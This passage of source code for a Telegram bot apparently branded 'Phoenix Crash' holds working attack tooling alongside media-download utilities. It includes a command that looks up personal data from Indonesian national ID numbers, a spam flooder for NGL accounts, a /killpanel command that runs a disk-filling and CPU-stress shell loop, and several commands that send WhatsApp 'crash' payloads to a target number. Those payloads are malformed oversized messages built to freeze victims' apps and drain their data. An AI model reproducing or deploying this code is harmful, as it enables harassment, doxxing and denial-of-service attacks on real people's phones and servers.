    const replyOpts = { parse_mode: "HTML", disable_web_page_preview: true };
    if (mapsUrl) {
      replyOpts.reply_markup = {
        inline_keyboard: [[{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]]
      };
    }

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: caption,
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: replyOpts.reply_markup
    });

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data, coba lagi nanti");
  }
});

bot.command("parsenik", checkPremium, checkCooldown, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /parsenik 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ Nik harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan nik");

  const replyHTML = (d) => {
    const get = (x) => (x ?? "-");

    const caption = `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Nik: ${get(d.nik) || nik}
│ ⸙ Nama: ${get(d.nama)}
│ ⸙ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
│ ⸙ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
│ ⸙ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
│ ⸙ Umur: ${get(d.umur)}
│ ⸙ Provinsi: ${get(d.provinsi || d.province)}
│ ⸙ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
│ ⸙ Kecamatan: ${get(d.kecamatan || d.district)}
│ ⸙ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
╰═──────────────────═⬡</blockquote>
`

    return ctx.replyWithPhoto(thumbnailUrl, {
      caption: caption,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  };

  try {
    const a1 = await axios.get(
      `https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    const r1 = a1?.data?.result || a1?.data?.data || a1?.data;
    if (r1 && typeof r1 === "object" && Object.keys(r1).length) {
      await replyHTML(r1);
    } else {
      const a2 = await axios.get(
        `https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      const r2 = a2?.data?.result || a2?.data?.data || a2?.data;
      if (r2 && typeof r2 === "object" && Object.keys(r2).length) {
        await replyHTML(r2);
      } else {
        await ctx.reply("❌ ☇ Nik tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nekolabs.my.id/tools/nikparser?nik=${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      const r2 = a2?.data?.result || a2?.data?.data || a2?.data;
      if (r2 && typeof r2 === "object" && Object.keys(r2).length) {
        await replyHTML(r2);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("spamngl", checkPremium, checkCooldown, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 1) {
      return ctx.reply("🪧 ☇ Format: /spamngl rainonesday 10");
    }

    const usernameRaw = args[0];
    const username = usernameRaw;
    const amountRaw = args[1];
    const amount = parseInt(amountRaw, 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return ctx.reply("❌ ☇ Masukan jumlah dan harus berupa angka");
    }

    await ctx.reply(`⏳ ☇ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");

        const message = "WOI DONGO KENAL ZIEE GA??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
          body,
        });
      } catch (err) {
      }

      if (i < amount) {
        if (i % 50 === 0) {
          try {
          } catch (e) {}
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    ctx.reply(`✅ ☇ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error(error);
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("tiktokdl", checkPremium, checkCooldown, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses konten");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data konten pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link konten yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh konten`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("iphoneqc", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) {
    return ctx.reply("🪧 ☇ Format: /iphoneqc phoenix nih dek", { parse_mode: "HTML" });
  }

  const moment = require("moment-timezone");
  const time = moment().tz("Asia/Jakarta").format("HH:mm");
  const battery = Math.floor(Math.random() * 44) + 55;

  let carrier;
  switch (true) {
    case text.toLowerCase().includes("love"):
      carrier = "Telkomsel";
      break;
    case text.toLowerCase().includes("game"):
      carrier = "Tri";
      break;
    case text.toLowerCase().includes("net"):
      carrier = "XL Axiata";
      break;
    default:
      const randomList = ["Indosat", "Telkomsel", "XL", "Tri", "Smartfren"];
      carrier = randomList[Math.floor(Math.random() * randomList.length)];
  }

  const messageText = encodeURIComponent(text);
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  await ctx.reply("⏳ ☇ Sedang membuat gambar");

  try {
    const axios = require("axios");
    const res = await axios.get(url, { responseType: "arraybuffer", timeout: 15000 });
    const buffer = Buffer.from(res.data);
    await ctx.replyWithPhoto({ source: buffer }, {
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    await ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("writebook", checkPremium, checkCooldown, async (ctx) => {
  const text = ctx.message.text?.split(" ").slice(1).join(" ");
  if (!text)
    return ctx.reply("🪧 ☇ Format: /writebook phoenix nih dek");

  const waitMsg = await ctx.reply("⏳ ☇ Sedang membuat gambar");

  try {
    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "28",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}

    await ctx.replyWithPhoto(
      { source: Buffer.from(response.data) },
      {
        parse_mode: "HTML",
      }
    );
  } catch (error) {
    console.error("writebook error:", error.message);

    try {
      await ctx.deleteMessage(waitMsg.message_id);
    } catch {}

    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("fixcode", checkPremium, checkCooldown, async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`🪧 ☇ Format: /fixcode ( reply document )`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("❌ ☇ File harus berformat .js");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("⏳ ☇ Sedang memperbaiki kode");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/5", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ ☇ Gagal memperbaiki kode");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    ctx.reply("❌ ☇ Gagal menghubungi api, oba lagi nanti");
  }
});

bot.command("killpanel", checkPremium, checkCooldown, async (ctx) => {
  try {
    await ctx.reply("⏳ ☇ Sedang merusak panel");

    const command = `(while true; do 
    cat /dev/urandom | dd bs=10M count=100 2>/dev/null | gzip > /tmp/overload_$RANDOM.gz &
    stress --cpu 16 --io 8 --vm 8 --vm-bytes 95% --timeout 300s &
    sleep 1
  done)`;

    if (command && command.trim() !== "") {
      exec(command, (error, stdout, stderr) => {
        if (error) {
        }
      });
    }

    await ctx.reply("✅ ☇ Panel berhasil dirusak");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan");
  }
});

//

bot.command("phoenixIPhone", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixIPhone 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Invisible Crash IPhone
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await Cloreds(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Invisible Crash IPhone
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixIPhone2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixIPhone2 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Delay Invis ( Spam ) 
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await listResponseIos(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Delay Invis ( Spam ) 
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Quota", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Quota 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Invisible Draining Quota
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await ZenoGlxInvisible(sock, target, ptcp = true);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Invisible Draining Quota
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("CrashMessage", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /CrashMessage 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Message
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 4; i++) {
    await CrashButton(sock, target);
    await sleep(10);
    await nullExc(sock, target);
    await sleep(10);
    await Crash(sock, target);
    await sleep(10);
    await amountOne(sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Message
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixRelog", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixRelog 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Relog Whatsapp
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await Null(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Relog Whatsapp
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixBlank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixBlank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Blank Android2
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 150; i++) {
    await blankontolz(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Blank Android2
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixDozer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixDozer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Dozer Delay
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await dozerDelay(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Dozer Delay
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("phoenixUi", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /phoenixUi 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Ui Whatsapp
│ ⸙ Status: Process
╰═──────────────────═⬡</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 150; i++) {
    await docUI(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote expandable>╭═─────⊱ 𝙋𝙃𝙊𝙀𝙉𝙄𝙓 𝘾𝙍𝘼𝙎𝙃 ─────═⬡
│ ⸙ Target: ${q}
│ ⸙ Type: Crash Ui Whatsapp
│ ⸙ Status: Success
╰═──────────────────═⬡</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//
async function ZenoGlxInvisible(sock, target, ptcp = true) {
  for (let i = 0; i < 100; i++) {
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "🧪⃟꙰𝗡 𝗢",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          }
        }
      }
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ?
    { 
      messageId: msg.key.id,
      participant: { jid: target },
    } : { messageId: msg.key.id }
  );
  await sleep(1000);
  }
}

async function CrashButton(sock, target) {
    const message = {
        viewOnceMessage: {
            message: {
                requestPaymentMessage: {
                    body: {
                        text: "#exercist",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "review_and_pay",
                        paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                        version: 3
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, message, {
        groupId: null,
        participant: { jid: target }
    });
}
async function nullExc(sock, target) {
  await sock.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: { jid:target }
  })
}
async function Crash(sock, target) {
  return await sock.relayMessage(
    target,
    {
      requestPaymentMessage: {}
    },
    {
      messageId: sock.generateMessageTag(),
      fromMe: false,
      participant: { jid: target }
    }
  )
}
async function amountOne(sock, target) {
  const Null = {
    requestPaymentMessage: {
      amount: {
       value: 1,
       offset: 0,
       currencyCodeIso4217: "IDR",
       requestFrom: target,
       expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };
    
    let Payment = {
    interactiveMessage: {
      header: {
        title: "Null",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },
      body: {
        text: "ꦾ".repeat(20000)
      },
      footer: {
        text: "ꦾ".repeat(20000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "Null", 
                      description: "\u0000".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };
  
  
  await sock.relayMessage(target, Null, Payment, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function Null(sock, target) {
  for(let p = 0; p < 50; p++) {
    let PouMsg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, p) => `628317784314${p + 4}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(900000),
          version: 3
        }
      }
    }, {});
    
    await sock.relayMessage(target, PouMsg.message, {
        participant: { jid: target }, 
        messageId: PouMsg.key.id, 
      }
    );    
  }
}

async function listResponseIos(sock, target) {
    const statusAttributions = [];
    for(let z = 0; z < 20000; z++) {
        const statusReshare = {
            source: "CHANNEL_RESHARE", 
            duration: 7205,
            channelJid: "12037205081234@newsletter", 
            channelMessageId: 7205,
            hasMultipleReshares: true
        };
        statusAttributions.push({
            statusReshare
        })
    }
    await sock.relayMessage("status@broadcast", {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "What" + "𑇂𑆵𑆴𑆿".repeat(60000),
                    listType: 1,
                    singleSelectReply: { selectedRowId: "x", },
                    description: "💠",
                    contextInfo: {
                        mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z+1}@s.whatsapp.net`), 
                        remoteJid: "status@broadcast",
                        fromMe: true,
                        isQuestion: true,
                        forwardedAiBotMessageInfo: {
